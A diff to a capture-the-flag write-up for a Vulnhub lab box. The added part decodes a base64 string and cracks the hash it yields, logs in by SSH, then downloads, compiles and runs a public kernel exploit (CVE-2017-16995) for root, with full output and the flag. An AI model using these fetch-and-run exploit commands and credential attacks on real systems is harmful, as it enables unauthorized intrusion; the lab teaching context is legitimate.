@@ -3,7 +3,7 @@ title: Vulnhub - Bizarre Adventure Sticky Fingers
 description: My writeup on Bizarre Adventure Sticky Fingers box.
 categories:
  - vulnhub
-tags: vulnhub hydra ssh base64 kernel
+tags: vulnhub hydra ssh base64 kernel wfuzz
 ---
 
 ![](https://i.kym-cdn.com/photos/images/original/001/420/906/1c2.jpg)
@@ -77,6 +77,8 @@ Zipperman is cool!
 Bucciarati
 ```
 
+## Shell as bucciarati
+
 Let's fire up hydra on login page. Here is the stupid part.. we have to wait l000000000000000ng time to get the password because the password is in line `1044216` :
 
 ```
@@ -114,4 +116,111 @@ ID           Response   Lines    Word     Chars       Payload
 ===================================================================
 
 000000004:   302        88 L     176 W    2643 Ch     "Password@123"                   
+```
+
+We're in as `Zipperman:Password@123`, and after we login redirect us to `/37d1d7d74bef0e8fafe6f8dc37ee25b0` we can see some ascii arts and a base64 string, let's decode it.
+
+```
+$ echo ODBlNDEzMDQwNzFjYmY1ODU2NTM2ZTM5MGYzYzc3ZjQ0NWE0OGVjMDE3NzQwNzdiOGM2ODNlMzA5YzUzMTMyOQ== | base64 -d
+80e41304071cbf5856536e390f3c77f445a48ec01774077b8c683e309c531329
+```
+
+Hmm seems like a hash, let's check it using `hash-identifier`:
+
+```
+HASH: 80e41304071cbf5856536e390f3c77f445a48ec01774077b8c683e309c531329 
+
+Possible Hashs:
+[+] SHA-256
+```
+
+Perfect, let's use [crackstation](https://crackstation.net/){:target="_blank"} to crack it.
+
+![](https://i.imgur.com/5RWBCEb.png)
+
+Now we can use the other username we found before and login in with SSH. `bucciarati:1Password1*`
+
+```
+$ ssh bucciarati@$ip                                                                                       
+bucciarati@192.168.1.17's password: 
+
+bucciarati@stickyfingers:~$ whoami;id
+bucciarati
+uid=1000(bucciarati) gid=1000(bucciarati) groups=1000(bucciarati),46(plugdev)
+```
+
+## Shell as root
+
+I did lot of enumeration and i found nothing. I checked the history and i found something really interesting:
+
+```
+bucciarati@stickyfingers:~$ history
+...data...
+90  wget http://10.0.0.39:8000/CVE-2017-16995.c
+91  gcc CVE-2017-16995.c -o cve2017
+```
+
+Probably maker forgot to delete it? anyway i found the exploit [here](https://www.exploit-db.com/exploits/45010){:target="_blank"} and let's use it.
+
+```
+bucciarati@stickyfingers:/tmp$ wget -q https://www.exploit-db.com/raw/45010 -O exploit.c
+bucciarati@stickyfingers:/tmp$ gcc exploit.c -o exploit
+bucciarati@stickyfingers:/tmp$ chmod + exploit
+bucciarati@stickyfingers:/tmp$ ./exploit 
+[.] 
+[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
+[.] 
+[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
+[.] 
+[*] creating bpf map
+[*] sneaking evil bpf past the verifier
+[*] creating socketpair()
+[*] attaching bpf backdoor to socket
+[*] skbuff => ffff8e4c3c70e300
+[*] Leaking sock struct from ffff8e4c36699000
+[*] Sock->sk_rcvtimeo at offset 592
+[*] Cred structure at ffff8e4c3c6e1cc0
+[*] UID from cred structure: 1000, matches the current: 1000
+[*] hammering cred structure at ffff8e4c3c6e1cc0
+[*] credentials patched, launching shell...
+# whoami;id
+root
+uid=0(root) gid=0(root) groups=0(root),46(plugdev),1000(bucciarati)
+```
+
+Let's read the flag:
+
+```
+# cat flag.txt.txt
+                 uuuuuuu
+             uu$$$$$$$$$$$uu
+          uu$$$$$$$$$$$$$$$$$uu
+         u$$$$$$$$$$$$$$$$$$$$$u
+        u$$$$$$$$$$$$$$$$$$$$$$$u
+       u$$$$$$$$$$$$$$$$$$$$$$$$$u
+       u$$$$$$$$$$$$$$$$$$$$$$$$$u
+       u$$$$$$"   "$$$"   "$$$$$$u
+       "$$$$"      u$u       $$$$"
+        $$$u       u$u       u$$$
+        $$$u      u$$$u      u$$$
+         "$$$$uu$$$   $$$uu$$$$"
+          "$$$$$$$"   "$$$$$$$"
+            u$$$$$$$u$$$$$$$u
+             u$"$"$"$"$"$"$u
+  uuu        $$u$ $ $ $ $u$$       uuu
+ u$$$$        $$$$$u$u$u$$$       u$$$$
+  $$$$$uu      "$$$$$$$$$"     uu$$$$$$
+u$$$$$$$$$$$uu    """""    uuuu$$$$$$$$$$
+$$$$"""$$$$$$$$$$uuu   uu$$$$$$$$$"""$$$"
+ """      ""$$$$$$$$$$$uu ""$"""
+           uuuu ""$$$$$$$$$$uuu
+  u$$$uuu$$$$$$$$$uu ""$$$$$$$$$$$uuu$$$
+  $$$$$$$$$$""""           ""$$$$$$$$$$$"
+   "$$$$$"                      ""$$$$""
+     $$$"                         $$$$"
+
+FLAG{JoJ0sZ_B1Z4RrR3_AddV3nT9R3_}
+
+create by Joas Antonio
+Linkedin:https://bit.ly/3ki1WBE
 ```
